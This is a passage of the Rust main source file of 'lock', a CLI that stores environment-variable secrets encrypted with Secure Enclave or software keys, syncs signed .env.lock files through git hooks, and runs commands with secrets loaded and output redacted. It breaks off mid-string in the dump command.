mod check;
mod crypt;
mod dotenv;
mod hooks;
mod identity;
mod lockfile;
mod redact;
mod se;
mod store;

use std::collections::BTreeSet;
use std::fmt;
use std::io::{self, IsTerminal, Read};
use std::os::unix::process::{CommandExt, ExitStatusExt};
use std::path::{Path, PathBuf};
use std::process::{Command, ExitCode, Stdio};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicI32, Ordering};
use std::time::Duration;

use clap::{Parser, Subcommand};
use zeroize::Zeroizing;

use identity::{Identity, PublicId, Signer};
use lockfile::{LockFile, Unlocked};
use store::Store;

#[derive(Debug)]
pub enum Error {
    Msg(String),
    Decrypt,
    Io(io::Error),
}

impl Error {
    pub fn msg(s: impl Into<String>) -> Error {
        Error::Msg(s.into())
    }
}

impl fmt::Display for Error {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        match self {
            Error::Msg(m) => f.write_str(m),
            Error::Decrypt => f.write_str("could not decrypt (wrong key or tampered file)"),
            Error::Io(e) => write!(f, "{e}"),
        }
    }
}

impl From<io::Error> for Error {
    fn from(e: io::Error) -> Error {
        Error::Io(e)
    }
}

/// Encrypted environment variables: Touch ID on the Mac, a key on servers.
#[derive(Parser)]
#[command(
    name = "lock",
    version,
    after_help = "Shortcut to run with the environment loaded:\n  lock -- npm run dev          (repo environment)\n  lock Navis -- npm run dev    (explicit environment)"
)]
struct Cli {
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Create your identity (Secure Enclave on the Mac, a software key elsewhere)
    Init {
        /// Identity name (defaults to the hostname)
        #[arg(long)]
        name: Option<String>,
        /// Use a software key (only on machines without a Secure Enclave)
        #[arg(long)]
        software: bool,
        /// Do not store: print a new software key for a server, CI or an offline backup
        #[arg(long)]
        print: bool,
    },
    /// Show your public identity (lockid1:...) so others can grant you access or trust
    Key,
    /// List environments, or the names in an environment (without decrypting)
    #[command(alias = "ls")]
    List { env: Option<String> },
    /// Create an empty environment
    Create { env: String },
    /// Delete an environment from the local vault
    Destroy {
        env: String,
        #[arg(long)]
        yes: bool,
    },
    /// Store a secret. The value is read from stdin or a hidden prompt, never from arguments
    Set {
        /// ENV/NAME, or NAME inside a linked repo
        target: String,
        /// Generate a random value of N bytes (nobody sees it)
        #[arg(long, value_name = "N")]
        generate: Option<usize>,
    },
    /// Print a secret's value (asks for Touch ID)
    Get { target: String },
    /// Delete a secret
    #[command(alias = "remove")]
    Rm { target: String },
    /// Import a .env file into an environment (creates it if missing; otherwise adds and overwrites)
    Import { env: String, file: PathBuf },
    /// Run a command with the environment loaded. Shortcut: `lock [ENV] -- cmd`
    Exec {
        /// Environment (defaults to the repo's)
        env: Option<String>,
        /// Do not redact the output even when it is not going to a terminal
        #[arg(long)]
        no_redact: bool,
        #[arg(last = true, required = true)]
        command: Vec<String>,
    },
    /// Print `export ...` for `eval "$(lock load)"` in your shell
    Load {
        env: Option<String>,
        /// sh: `export K='v'`. github: masks the values and appends them to $GITHUB_ENV
        #[arg(long, value_enum, default_value_t = LoadFormat::Sh)]
        format: LoadFormat,
    },
    /// Link the current repo to an environment: writes .env.lock and installs hooks
    Link { env: String },
    /// Copy the environment from the vault to .env.lock (used by the pre-commit hook)
    Dump {
        /// Also run `git add .env.lock`
        #[arg(long)]
        stage: bool,
        /// Overwrite even if the repo has a different version
        #[arg(long)]
        force: bool,
    },
    /// Bring the repo's .env.lock into the local vault (if signed and newer)
    Pull {
        /// Accept even on a version conflict (keeps a .bak copy)
        #[arg(long)]
        force: bool,
    },
    /// Check that the variables the code uses are in the lock
    Check {
        /// Hook mode: check the commits git is about to push (reads stdin)
        #[arg(long)]
        pre_push: bool,
    },
    /// Git hooks: pre-commit updates .env.lock, pre-push runs `lock check`
    Hooks {
        #[command(subcommand)]
        cmd: Option<HooksCmd>,
    },
    /// Manage who can open an environment
    Recipient {
        #[command(subcommand)]
        cmd: RecipientCmd,
    },
    /// Recipients added to every new environment (for example, your backup)
    Defaults {
        #[command(subcommand)]
        cmd: NamedCmd,
    },
    /// Identities whose signature this machine accepts (for example, your other Mac)
    Trust {
        #[command(subcommand)]
        cmd: NamedCmd,
    },
}

#[derive(Subcommand)]
enum RecipientCmd {
    /// List the recipients
    #[command(alias = "ls")]
    List { env: Option<String> },
    /// Add a recipient (for example, a server)
    Add { env: String, name: String, identity: String },
    /// Remove a recipient and rotate the environment key
    #[command(alias = "remove")]
    Rm { env: String, name: String },
}

#[derive(Clone, Copy, clap::ValueEnum)]
enum LoadFormat {
    Sh,
    Github,
}

#[derive(Subcommand)]
enum HooksCmd {
    /// Install the hooks in the current repo (both by default)
    Install {
        /// Only the pre-commit hook (`lock dump --stage`)
        #[arg(long)]
        pre_commit: bool,
        /// Only the pre-push hook (`lock check --pre-push`)
        #[arg(long)]
        pre_push: bool,
    },
    /// Remove lock's blocks from the hooks (leaves the rest intact)
    Uninstall,
    /// Show which hooks are installed
    Status,
}

#[derive(Subcommand)]
enum NamedCmd {
    /// Show the list
    #[command(alias = "ls")]
    List,
    /// Add an identity (lockid1:..., printed by `lock key` or `lock init --print`)
    Add { name: String, identity: String },
    /// Remove an identity from the list
    #[command(alias = "remove")]
    Rm { name: String },
}

fn main() -> ExitCode {
    disable_core_dumps();
    let cli = Cli::parse_from(expand_shortcut(std::env::args().collect()));
    match run(cli.cmd) {
        Ok(code) => code,
        Err(e) => {
            eprintln!("lock: {e}");
            ExitCode::FAILURE
        }
    }
}

/// `lock -- cmd` y `lock ENV -- cmd` son atajos de `lock exec [ENV] -- cmd`.
fn expand_shortcut(mut args: Vec<String>) -> Vec<String> {
    use clap::CommandFactory;
    let is_command = |a: &str| {
        Cli::command().get_subcommands().any(|c| c.get_name() == a || c.get_all_aliases().any(|al| al == a))
    };
    let shortcut = match args.get(1).map(String::as_str) {
        Some("--") => true,
        Some(env) => !env.starts_with('-') && !is_command(env) && args.get(2).is_some_and(|a| a == "--"),
        None => false,
    };
    if shortcut {
        args.insert(1, "exec".into());
    }
    args
}

fn disable_core_dumps() {
    let zero = libc::rlimit { rlim_cur: 0, rlim_max: 0 };
    unsafe { libc::setrlimit(libc::RLIMIT_CORE, &zero) };
}

/// Un entorno encontrado y verificado, y donde escribirlo si cambia.
struct Resolved {
    file: LockFile,
    in_vault: bool,
    /// `.env.lock` del repo actual, si esta vinculado a este entorno.
    repo: Option<PathBuf>,
}

struct Ctx {
    store: Store,
    cwd: PathBuf,
}

impl Ctx {
    fn identities(&self) -> Result<Vec<Identity>, Error> {
        let ids = identity::load_all(&self.store.keys_dir())?;
        if ids.is_empty() {
            return Err(Error::msg(format!(
                "no keys in {} or in ${}. Run `lock init`.",
                self.store.keys_dir().display(),
                identity::ENV_VAR
            )));
        }
        Ok(ids)
    }

    /// Firmantes de confianza: tus identidades, los fijados en `LOCK_KEY` y `~/.lock/trusted`.
    fn trusted(&self) -> Result<Vec<Signer>, Error> {
        let mut out = vec![];
        for id in identity::load_all(&self.store.keys_dir())? {
            for (i, t) in id.embedded_trust.iter().enumerate() {
                out.push(Signer { name: format!("{}-trust{}", id.name, i + 1), public: t.clone() });
            }
            out.push(Signer { name: id.name.clone(), public: id.public.signing.clone() });
        }
        for (name, s) in self.store.named_list("trusted")? {
            if let Ok(p) = PublicId::decode(&s) {
                out.push(Signer { name, public: p.signing });
            }
        }
        Ok(out)
    }

    fn verify(&self, file: &LockFile) -> Result<(), Error> {
        file.verify(&self.trusted()?).map(|_| ())
    }

    fn repo_file(&self) -> Option<PathBuf> {
        store::find_repo_file(&self.cwd)
    }

    /// Entorno al que `lock link` vinculo este repo (guardado en .git/config, no en el archivo).
    fn binding(&self) -> Option<String> {
        let out = Command::new("git").arg("-C").arg(&self.cwd).args(["config", "--get", "lock.env"]).output().ok()?;
        let s = String::from_utf8_lossy(&out.stdout).trim().to_string();
        (out.status.success() && lockfile::valid_env_name(&s)).then_some(s)
    }

    /// Busca el entorno: en la boveda primero; si no, en el `.env.lock` del repo.
    /// Todo lo que devuelve esta firmado por alguien de confianza.
    fn resolve(&self, env: Option<&str>) -> Result<Resolved, Error> {
        let env = match env {
            Some(e) => e.to_string(),
            None => {
                let path = self
                    .repo_file()
                    .ok_or_else(|| Error::msg("no .env.lock here; specify the environment (ENV or ENV/NAME)"))?;
                store::read_lockfile(&path)?.env
            }
        };
        let repo = self.repo_file().filter(|p| {
            store::read_lockfile(p).is_ok_and(|f| f.env == env) && self.binding().is_none_or(|b| b == env)
        });
        if let Some(file) = self.store.load(&env)? {
            self.verify(&file)?;
            if let Some(p) = &repo
                && let Ok(r) = store::read_lockfile(p)
                && r.version != file.version
            {
                eprintln!("lock: using {env} v{} from the vault (this repo's .env.lock: v{})", file.version, r.version);
            }
            return Ok(Resolved { file, in_vault: true, repo });
        }
        match repo {
            Some(p) => {
                let file = store::read_lockfile(&p)?;
                self.verify(&file)?;
                self.store.check_seen(&file)?;
                // Si no se puede registrar (home de solo lectura), se sigue sin proteccion de rollback.
                if let Err(e) = self.store.record_seen(&file) {
                    eprintln!("lock: warning: could not record the seen version ({e})");
                }
                Ok(Resolved { file, in_vault: false, repo: Some(p) })
            }
            None => Err(Error::msg(format!("environment {env} does not exist. `lock list` shows the available ones."))),
        }
    }

    fn persist(&self, r: &Resolved, file: &LockFile) -> Result<(), Error> {
        if r.in_vault {
            self.store.save(file)?;
        } else {
            self.store.record_seen(file)?;
        }
        if let Some(p) = &r.repo {
            store::write_atomic(p, file.serialize().as_bytes(), 0o644)?;
        }
        Ok(())
    }

    /// Lectura-modificacion-escritura bajo bloqueo: descifra, aplica `f`, firma y guarda.
    /// Descifrar y firmar comparten un solo Touch ID.
    fn modify(&self, env: &str, reason: &str, f: impl FnOnce(&mut Unlocked) -> Result<(), Error>) -> Result<(), Error> {
        let _guard = self.store.lock_env(env)?;
        let r = self.resolve(Some(env))?;
        let ids = self.identities()?;
        let mut u = r.file.unlock(&ids, &self.trusted()?, reason)?;
        f(&mut u)?;
        let signer = &ids[0];
        if signer.kind == identity::Kind::Software && identity::enclave_available() {
            eprintln!("lock: warning: signing with a software key ({})", signer.name);
        }
        let file = u.seal(signer, reason)?;
        self.persist(&r, &file)
    }

    fn open(&self, r: &Resolved, reason: &str) -> Result<Unlocked, Error> {
        r.file.unlock(&self.identities()?, &self.trusted()?, reason)
    }

    /// Separa `ENV/NOMBRE`; sin `/` usa el entorno del repo.
    fn target(&self, target: &str) -> Result<(Resolved, String), Error> {
        let (env, name) = match target.split_once('/') {
            Some((e, n)) => (Some(e), n),
            None => (None, target),
        };
        Ok((self.resolve(env)?, name.to_string()))
    }
}

/// Texto del dialogo de Touch ID. Una sola linea, solo ASCII imprimible (sin
/// saltos, controles ni trucos Unicode), y si es largo se recorta por el
/// medio: el final del comando nunca queda oculto.
fn reason(action: &str, detail: &str) -> String {
    let clean: String = detail
        .chars()
        .map(|c| if c.is_ascii_graphic() || c == ' ' { c } else { '?' })
        .collect::<String>()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ");
    const MAX: usize = 150;
    let shown = if clean.len() > MAX {
        format!("{} [...{} chars...] {}", &clean[..70], clean.len() - 140, &clean[clean.len() - 70..])
    } else {
        clean
    };
    if shown.is_empty() { action.to_string() } else { format!("{action}: {shown}") }
}

fn hostname() -> String {
    let mut buf = [0u8; 256];
    let ok = unsafe { libc::gethostname(buf.as_mut_ptr().cast(), buf.len()) } == 0;
    let raw = if ok {
        let end = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
        String::from_utf8_lossy(&buf[..end]).into_owned()
    } else {
        "local".into()
    };
    let name: String = raw
        .split('.')
        .next()
        .unwrap_or("local")
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() || c == '-' { c.to_ascii_lowercase() } else { '-' })
        .collect();
    if lockfile::valid_id_name(&name) { name } else { "local".into() }
}

fn read_value(label: &str) -> Result<Zeroizing<String>, Error> {
    if io::stdin().is_terminal() {
        return Ok(Zeroizing::new(rpassword::prompt_password(format!("Value of {label} (hidden): "))?));
    }
    let mut v = Zeroizing::new(String::new());
    io::stdin().take(1024 * 1024).read_to_string(&mut v)?;
    if v.ends_with('\n') {
        v.pop();
        if v.ends_with('\r') {
            v.pop();
        }
    }
    Ok(v)
}

fn run(cmd: Cmd) -> Result<ExitCode, Error> {
    let ctx = Ctx { store: Store::open()?, cwd: std::env::current_dir()? };
    match cmd {
        Cmd::Init { name, software, print } => cmd_init(&ctx, name, software, print),
        Cmd::Key => {
            let ids = ctx.identities()?;
            for id in &ids {
                println!("{}\t{}\t{}", id.name, id.kind.as_str(), id.public.encode());
            }
            if identity::enclave_available() && ids.iter().any(|i| i.kind == identity::Kind::Software) {
                eprintln!("\nlock: WARNING: there are software keys on this Mac. Any process of yours can use them without Touch ID.");
                eprintln!("      Store them offline and delete them from {}.", ctx.store.keys_dir().display());
            }
            eprintln!("\nTo grant access:  lock recipient add <ENV> <name> <lockid1:...>");
            eprintln!("To trust:         lock trust add <name> <lockid1:...>");
            Ok(ExitCode::SUCCESS)
        }
        Cmd::List { env: None } => cmd_list(&ctx),
        Cmd::List { env: Some(env) } => {
            let r = ctx.resolve(Some(&env))?;
            for n in r.file.names() {
                println!("{n}");
            }
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Create { env } => {
            create(&ctx, &env)?;
            eprintln!("Environment {env} created. Add secrets with `lock set {env}/NAME`.");
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Destroy { env, yes } => {
            if !yes {
                return Err(Error::msg(format!("this deletes {env} from the local vault. Repeat with --yes to confirm.")));
            }
            if !ctx.store.delete(&env)? {
                return Err(Error::msg(format!("environment {env} does not exist in the vault")));
            }
            eprintln!("Environment {env} deleted from the vault. .env.lock files committed in repos still exist.");
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Set { target, generate } => {
            let (r, name) = ctx.target(&target)?;
            let env = r.file.env.clone();
            if !lockfile::valid_key_name(&name) {
                return Err(Error::msg("invalid name (use letters, digits and _; cannot start with a digit)"));
            }
            let value = match generate {
                Some(n) if n == 0 || n > 1024 => return Err(Error::msg("--generate accepts between 1 and 1024 bytes")),
                Some(n) => {
                    use base64::Engine;
                    Zeroizing::new(base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(crypt::random_bytes(n)))
                }
                None => read_value(&format!("{env}/{name}"))?,
            };
            ctx.modify(&env, &reason(&format!("store {env}/{name}"), ""), |u| u.set(&name, &value))?;
            eprintln!("{env}/{name} stored.");
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Get { target } => {
            let (r, name) = ctx.target(&target)?;
            if !r.file.contains(&name) {
                return Err(Error::msg(format!("{}/{name} does not exist", r.file.env)));
            }
            let u = ctx.open(&r, &reason(&format!("SHOW in plain text {}/{name}", r.file.env), ""))?;
            println!("{}", u.get(&name)?.as_deref().map(String::as_str).unwrap_or(""));
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Rm { target } => {
            let (r, name) = ctx.target(&target)?;
            let env = r.file.env.clone();
            if !r.file.contains(&name) {
                return Err(Error::msg(format!("{env}/{name} does not exist")));
            }
            ctx.modify(&env, &reason(&format!("delete {env}/{name}"), ""), |u| {
                u.remove(&name);
                Ok(())
            })?;
            eprintln!("{env}/{name} deleted.");
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Import { env, file } => {
            let text = Zeroizing::new(store::read_limited(&file, 1024 * 1024)?);
            let pairs = dotenv::parse(&text).map_err(|e| Error::msg(format!("{}: {e}", file.display())))?;
            let pairs: Vec<(String, Zeroizing<String>)> = pairs.into_iter().map(|(k, v)| (k, Zeroizing::new(v))).collect();
            // Si el entorno existe en algun lado (boveda o repo), se agrega sobre el; solo se crea si no.
            if ctx.resolve(Some(&env)).is_err() {
                create(&ctx, &env)?;
            }
            ctx.modify(&env, &reason(&format!("import {} variables into {env}", pairs.len()), ""), |u| {
                for (k, v) in &pairs {
                    u.set(k, v)?;
                }
                Ok(())
            })?;
            eprintln!("{} variables imported into {env}. Delete {} (do not commit it).", pairs.len(), file.display());
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Exec { env, no_redact, command } => cmd_exec(&ctx, env.as_deref(), no_redact, &command),
        Cmd::Load { env, format } => {
            let r = ctx.resolve(env.as_deref())?;
            let u = ctx.open(&r, &reason(&format!("EXPORT all of {} in plain text", r.file.env), ""))?;
            let values = u.all()?;
            match format {
                LoadFormat::Sh => {
                    for (k, v) in &values {
                        // Los nombres vienen validados por el parser; igual no se imprime nada raro.
                        if lockfile::valid_key_name(k) {
                            println!("export {k}={}", dotenv::shell_quote(v));
                        }
                    }
                }
                LoadFormat::Github => load_github(&values)?,
            }
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Link { env } => cmd_link(&ctx, &env),
        Cmd::Dump { stage, force } => cmd_dump(&ctx, stage, force),
        Cmd::Pull { force } => cmd_pull(&ctx, force),
        Cmd::Check { pre_push } => cmd_check(&ctx, pre_push),
        Cmd::Hooks { cmd } => cmd_hooks(&ctx, cmd.unwrap_or(HooksCmd::Status)),
        Cmd::Recipient { cmd } => cmd_recipient(&ctx, cmd),
        Cmd::Defaults { cmd } => cmd_named(&ctx, "recipients", cmd),
        Cmd::Trust { cmd } => cmd_named(&ctx, "trusted", cmd),
    }
}

fn cmd_init(ctx: &Ctx, name: Option<String>, software: bool, print: bool) -> Result<ExitCode, Error> {
    let name = name.unwrap_or_else(hostname);
    if !lockfile::valid_id_name(&name) {
        return Err(Error::msg("invalid name (use letters, digits, . _ -)"));
    }
    if print {
        // La clave nueva lleva fijados como de confianza a los firmantes de este
        // equipo: el servidor solo aceptara archivos firmados por ellos.
        let trust: Vec<Vec<u8>> = ctx.trusted()?.into_iter().map(|s| s.public).collect();
        let id = Identity::new_software(&name);
        println!("{}", *id.private_string(&trust).unwrap());
        eprintln!("Identity of {name}: {}", id.public.encode());
        eprintln!("1. Store the stdout line as secret {} on the server/CI (or in an offline manager if it is a backup).", identity::ENV_VAR);
        eprintln!("2. Grant it access here:  lock recipient add <ENV> {name} {}", id.public.encode());
        eprintln!("   (backup for every new environment:  lock defaults add {name} {})", id.public.encode());
        if trust.is_empty() {
            eprintln!("WARNING: this machine has no identities; the key does not trust any signer.");
        }
        return Ok(ExitCode::SUCCESS);
    }
    let se = identity::enclave_available();
    if software && se {
        return Err(Error::msg(
            "this Mac has a Secure Enclave: a software key stored here would allow decrypting without Touch ID. \
             Use `lock init` (Secure Enclave), or `lock init --print` to generate a server key or an offline backup key.",
        ));
    }
    let mut id = if se { Identity::new_enclave(&name)? } else { Identity::new_software(&name) };
    let path = id.save(&ctx.store.keys_dir())?;
    eprintln!("Identity {name} ({}) created at {}", id.kind.as_str(), path.display());
    if id.kind == identity::Kind::Enclave {
        eprintln!("The keys live in the Secure Enclave: they cannot be copied and every use asks for Touch ID.");
        eprintln!("If this Mac is lost, so are they. Create an offline backup and register it for every new environment:");
        eprintln!("  lock init --print --name backup    # store the key in your password manager");
        eprintln!("  lock defaults add backup <lockid1:...>");
    }
    println!("{}", id.public.encode());
    Ok(ExitCode::SUCCESS)
}

fn create(ctx: &Ctx, env: &str) -> Result<(), Error> {
    if !lockfile::valid_env_name(env) {
        return Err(Error::msg("invalid environment name (use letters, digits, . _ -)"));
    }
    let _guard = ctx.store.lock_env(env)?;
    if ctx.store.exists(env) {
        return Err(Error::msg(format!("environment {env} already exists")));
    }
    let ids = ctx.identities()?;
    // Destinatarios iniciales: tus claves guardadas (no LOCK_KEY) y los defaults (p. ej. respaldo).
    let mut recipients: Vec<(String, PublicId)> = ids
        .iter()
        .filter(|i| i.source != identity::ENV_VAR)
        .map(|i| (i.name.clone(), i.public.clone()))
        .collect();
    for (name, s) in ctx.store.named_list("recipients")? {
        let id = PublicId::decode(&s).map_err(|e| Error::msg(format!("~/.lock/recipients ({name}): {e}")))?;
        if !recipients.iter().any(|(n, p)| *n == name || p.encryption == id.encryption) {
            recipients.push((name, id));
        }
    }
    if recipients.is_empty() {
        return Err(Error::msg("no stored keys on this machine. Run `lock init`."));
    }
    let file = LockFile::create(env, &recipients)?.seal(&ids[0], &reason(&format!("create {env}"), ""))?;
    ctx.store.save(&file)
}

fn cmd_list(ctx: &Ctx) -> Result<ExitCode, Error> {
    let trusted = ctx.trusted()?;
    let repo = ctx.repo_file().and_then(|p| store::read_lockfile(&p).ok());
    let envs = ctx.store.list()?;
    if envs.is_empty() && repo.is_none() {
        eprintln!("No environments. Create one with `lock create <Name>`.");
    }
    let describe = |f: &LockFile| {
        let who: Vec<&str> = f.recipients.iter().map(|r| r.name.as_str()).collect();
        let warn = match f.verify(&trusted) {
            Ok(_) => String::new(),
            Err(_) => "  ! untrusted signature".into(),
        };
        format!("{}\tv{}\t{} secrets\t[{}]{warn}", f.env, f.version, f.len(), who.join(", "))
    };
    for env in &envs {
        match ctx.store.load(env) {
            Ok(Some(f)) => {
                let mark = if repo.as_ref().is_some_and(|r| r.env == *env) { "  * this repo" } else { "" };
                println!("{}{mark}", describe(&f));
            }
            Ok(None) => {}
            Err(e) => println!("{env}\t! {e}"),
        }
    }
    if let Some(f) = repo
        && !envs.contains(&f.env)
    {
        println!("{}  (only in this repo's .env.lock)", describe(&f));
    }
    Ok(ExitCode::SUCCESS)
}

/// Pid (o grupo) del hijo de `lock exec`, para reenviarle senales.
static CHILD: AtomicI32 = AtomicI32::new(0);
static OWN_GROUP: AtomicBool = AtomicBool::new(false);
static PENDING: AtomicI32 = AtomicI32::new(0);

extern "C" fn forward_signal(sig: libc::c_int) {
    let pid = CHILD.load(Ordering::SeqCst);
    if pid <= 0 {
        PENDING.store(sig, Ordering::SeqCst);
        return;
    }
    deliver(pid, sig);
}

fn deliver(pid: i32, sig: libc::c_int) {
    if OWN_GROUP.load(Ordering::SeqCst) {
        unsafe { libc::killpg(pid, sig) };
    } else if sig != libc::SIGINT && sig != libc::SIGQUIT {
        // Mismo grupo que la terminal: Ctrl-C ya le llega al hijo directamente.
        unsafe { libc::kill(pid, sig) };
    }
}

fn cmd_exec(ctx: &Ctx, env: Option<&str>, no_redact: bool, argv: &[String]) -> Result<ExitCode, Error> {
    let r = ctx.resolve(env)?;
    let action = if no_redact {
        format!("UNREDACTED, run with {}", r.file.env)
    } else {
        format!("run with {}", r.file.env)
    };
    let values = ctx.open(&r, &reason(&action, &argv.join(" ")))?.all()?;

    let mut cmd = Command::new(&argv[0]);
    cmd.args(&argv[1..]);
    // El hijo recibe los secretos del entorno, nunca la clave privada.
    cmd.env_remove(identity::ENV_VAR);
    for (k, v) in &values {
        cmd.env(k, v.as_str());
    }

    // Si la salida va a una terminal, la ve una persona: se reemplaza el proceso
    // tal cual. Si no (un agente, un pipe, un log), se redactan los valores.
    // La redaccion es higiene contra ecos accidentales, no una barrera.
    let redactor = Arc::new(redact::Redactor::new(&values));
    drop(values);
    let to_terminal = io::stdout().is_terminal() && io::stderr().is_terminal();
    if no_redact || to_terminal || redactor.is_empty() {
        let err = cmd.exec();
        return Err(Error::msg(format!("{}: {err}", argv[0])));
    }

    // Sin terminal en stdin, el hijo va en su propio grupo para poder terminar
    // el arbol completo; con terminal, comparte grupo para poder leerla.
    let own_group = !io::stdin().is_terminal();
    if own_group {
        cmd.process_group(0);
    }
    OWN_GROUP.store(own_group, Ordering::SeqCst);
    for sig in [libc::SIGINT, libc::SIGTERM, libc::SIGHUP, libc::SIGQUIT] {
        unsafe { libc::signal(sig, forward_signal as *const () as libc::sighandler_t) };
    }
    let mut child = cmd
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| Error::msg(format!("{}: {e}", argv[0])))?;
    CHILD.store(child.id() as i32, Ordering::SeqCst);
    let pending = PENDING.swap(0, Ordering::SeqCst);
    if pending != 0 {
        deliver(child.id() as i32, pending);
    }

    let (tx, rx) = std::sync::mpsc::channel();
    let streams: [(Box<dyn Read + Send>, bool); 2] =
        [(Box::new(child.stdout.take().unwrap()), true), (Box::new(child.stderr.take().unwrap()), false)];
    for (stream, is_out) in streams {
        let (tx, redactor) = (tx.clone(), Arc::clone(&redactor));
        std::thread::spawn(move || {
            let res = if is_out {
                redactor.copy(stream, io::stdout().lock())
            } else {
                redactor.copy(stream, io::stderr().lock())
            };
            let _ = tx.send(res);
        });
    }
    drop(tx);

    let status = child.wait()?;
    // Un descendiente puede dejar los pipes abiertos: se espera un poco y se sigue.
    let mut copy_failed = false;
    let deadline = std::time::Instant::now() + Duration::from_secs(2);
    for _ in 0..2 {
        let left = deadline.saturating_duration_since(std::time::Instant::now());
        match rx.recv_timeout(left) {
            Ok(Ok(())) => {}
            Ok(Err(e)) if e.kind() == io::ErrorKind::BrokenPipe => {}
            Ok(Err(e)) => {
                eprintln!("lock: error copying the output: {e}");
                copy_failed = true;
            }
            Err(_) => {
                eprintln!("lock: a child process still has the output open; no longer reading it");
                break;
            }
        }
    }
    CHILD.store(0, Ordering::SeqCst);

    let code = status.code().unwrap_or_else(|| 128 + status.signal().unwrap_or(1));
    let code = if code == 0 && copy_failed { 1 } else { code };
    Ok(ExitCode::from(code.clamp(0, 255) as u8))
}

fn git(dir: &Path, args: &[&str]) -> Result<(), Error> {
    let ok = Command::new("git").arg("-C").arg(dir).args(args).status()?.success();
    if !ok {
        return Err(Error::msg(format!("git {} failed", args.join(" "))));
    }
    Ok(())
}

fn cmd_link(ctx: &Ctx, env: &str) -> Result<ExitCode, Error> {
    let root = store::repo_root(&ctx.cwd).ok_or_else(|| Error::msg("not inside a git repo"))?;
    let file = ctx.store.load(env)?.ok_or_else(|| Error::msg(format!("environment {env} does not exist in the vault")))?;
    ctx.verify(&file)?;
    let path = root.join(store::REPO_FILE);
    if let Ok(current) = store::read_lockfile(&path)
        && current.env != env
    {
        return Err(Error::msg(format!(
            "{} already belongs to {}; delete it first if you want to change it",
            path.display(),
            current.env
        )));
    }
    store::write_atomic(&path, file.serialize().as_bytes(), 0o644)?;
    git(&root, &["config", "lock.env", env])?;

    // Sin merge de texto: un conflicto se resuelve eligiendo una version entera.
    let attrs = root.join(".gitattributes");
    let current = store::read_limited(&attrs, 1024 * 1024).unwrap_or_default();
    if !current.lines().any(|l| l.trim() == ".env.lock -merge") {
        let sep = if current.is_empty() || current.ends_with('\n') { "" } else { "\n" };
        store::write_atomic(&attrs, format!("{current}{sep}.env.lock -merge\n").as_bytes(), 0o644)?;
    }
    for p in hooks::install(&root, &["pre-commit", "pre-push"])? {
        eprintln!("hook installed: {}", p.display());
    }
    eprintln!("Repo linked to {env}: {}", path.display());
    eprintln!("Commit .env.lock and .gitattributes. .env (plain text) must be in .gitignore.");
    Ok(ExitCode::SUCCESS)
}

/// Para GitHub Actions: enmascara cada valor en los logs (`::add-mask::`) y lo
/// agrega a `$GITHUB_ENV` para los pasos siguientes, con un delimitador
/// aleatorio para que un valor no pueda inyectar otras variables.
fn load_github(values: &[(String, lockfile::Value)]) -> Result<(), Error> {
    use std::io::Write;
    let path = std::env::var_os("GITHUB_ENV").ok_or_else(|| Error::msg("GITHUB_ENV is not set (only works inside GitHub Actions)"))?;
    // Primero todas las mascaras, antes de que el valor pueda aparecer en un log.
    for (_, v) in values {
        for line in v.lines().filter(|l| l.trim().len() >= redact::MIN_LEN) {
            println!("::add-mask::{line}");
        }
    }
    io::stdout().lock().flush()?;
    let mut out = Zeroizing::new(String::new());
    for (k, v) in values {
        if !lockfile::valid_key_name(k) {
            continue;
        }
        let delim: String = crypt::random_bytes(12).iter().map(|b| format!("{b:02x}")).collect();
        out.push_str(&format!("{k}<<LOCK_{delim}\n{}\nLOCK_{delim}\n", v.as_str()));
    }
    std::fs::OpenOptions::new().append(true).open(path)?.write_all(out.as_bytes())?;
    eprintln!("lock: {} variables exported to the following steps (masked in logs).", values.len());
    Ok(())
}

fn cmd_hooks(ctx: &Ctx, cmd: HooksCmd) -> Result<ExitCode, Error> {
    let root = store::repo_root(&ctx.cwd).ok_or_else(|| Error::msg("not inside a git repo"))?;
    match cmd {
        HooksCmd::Install { pre_commit, pre_push } => {
            let which: Vec<&str> = match (pre_commit, pre_push) {
                (true, false) => vec!["pre-commit"],
                (false, true) => vec!["pre-push"],
                _ => vec!["pre-commit", "pre-push"],
            };
            for p in hooks::install(&root, &which)? {
                eprintln!("hook installed: {}", p.display());
            }
            if ctx.binding().is_none() {
                eprintln!("Note: this repo is not linked; the pre-commit hook will do nothing until `lock link <ENV>`.");
            }
        }
        HooksCmd::Uninstall => {
            let touched = hooks::uninstall(&root)?;
            if touched.is_empty() {
                eprintln!("No lock hooks were installed.");
            }
            for p in touched {
                eprintln!("hook removed: {}", p.display());
            }
        }
        HooksCmd::Status => {
            for (hook, path, installed) in hooks::status(&root)? {
                let cmd = hooks::HOOKS.iter().find(|(h, _)| *h == hook).map_or("", |(_, c)| c);
                let state = if installed { "installed" } else { "not installed" };
                println!("{hook}\t{state}\t{cmd}\t{}", path.display());
            }
            if ctx.binding().is_none() {
                eprintln!("This repo is not linked to any environment (`lock link <ENV>`).");
            }
        }
    }
    Ok(ExitCode::SUCCESS)
}

fn cmd_dump(ctx: &Ctx, stage: bool, force: bool) -> Result<ExitCode, Error> {
    let Some(path) = ctx.repo_file() else { return Ok(ExitCode::SUCCESS) };
    // Solo repos vinculados en este equipo; el entorno sale de .git/config, no del archivo.
    let Some(env) = ctx.binding() else { return Ok(ExitCode::SUCCESS) };
    let Some(vault) = ctx.store.load(&env)? else { return Ok(ExitCode::SUCCESS) };
    ctx.verify(&vault)?;

    let repo = store::read_lockfile(&path).ok();
    let trusted_repo = repo.filter(|f| f.env == env && ctx.verify(f).is_ok());
    if let Some(repo) = &trusted_repo
        && !force
    {
        if repo.version > vault.version {
            return Err(Error::msg(format!(
                ".env.lock ({env} v{}) is newer than the vault (v{}) and is signed by someone you trust. \
